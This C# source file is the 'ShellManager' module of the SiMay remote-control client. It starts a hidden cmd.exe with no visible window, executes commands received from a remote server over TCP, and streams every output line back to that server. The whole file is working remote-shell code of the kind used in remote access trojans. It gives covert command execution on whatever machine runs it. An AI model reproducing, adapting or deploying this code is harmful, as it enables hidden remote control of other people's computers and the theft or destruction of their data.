using SiMay.Core;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.RemoteService.NewCore.Attributes;
using SiMay.RemoteService.NewCore.Extensions;
using SiMay.RemoteService.NewCore.ServiceSource;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System.Diagnostics;

namespace SiMay.RemoteService.NewCore.ControlService
{
    [ServiceKey("RemoteShellJob")]
    public class ShellManager : ServiceManager, IServiceSource
    {
        private Process _pipe = new Process();
        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                    break;
                case TcpSocketCompletionNotify.OnClosed:
                    this._handlerBinder.Dispose();
                    _pipe.Kill();
                    break;
            }
        }
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void InitializeComplete(TcpSocketSaeaSession session)
        {
            this.Init();
            SendAsyncToServer(MessageHead.C_MAIN_OPEN_DLG,
                new OpenDialogPack()
                {
                    IdentifyId = AppConfiguartion.IdentifyId,
                    ServiceKey = this.GetType().GetServiceKey()
                });
        }
        [PacketHandler(MessageHead.S_GLOBAL_ONCLOSE)]
        public void CloseSession(TcpSocketSaeaSession session)
            => this.CloseSession();

        private void Init()
        {
            _pipe.StartInfo.FileName = "cmd.exe";
            _pipe.StartInfo.CreateNoWindow = true;  //设置不显示窗口
            _pipe.StartInfo.UseShellExecute = false;// 必须禁用操作系统外壳程序
            _pipe.StartInfo.RedirectStandardOutput = true;
            _pipe.StartInfo.RedirectStandardInput = true;
            _pipe.StartInfo.RedirectStandardError = true; //重定向错误输出
            _pipe.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            _pipe.Start();
            _pipe.BeginOutputReadLine();// 异步获取命令行内容
            _pipe.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler); // 为异步获取订阅事件
        }

        [PacketHandler(MessageHead.S_SHELL_INPUT)]
        public void StartCommand(TcpSocketSaeaSession session)
        {
            byte[] payload = session.CompletedBuffer.GetMessageBody();
            string command = payload.ToUnicodeString();

            _pipe.StandardInput.WriteLine(command);
        }

        private void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (outLine.Data == null)
                return;
            SendAsyncToServer(MessageHead.C_SHELL_RESULT, "\r\n" + outLine.Data);
        }
    }
}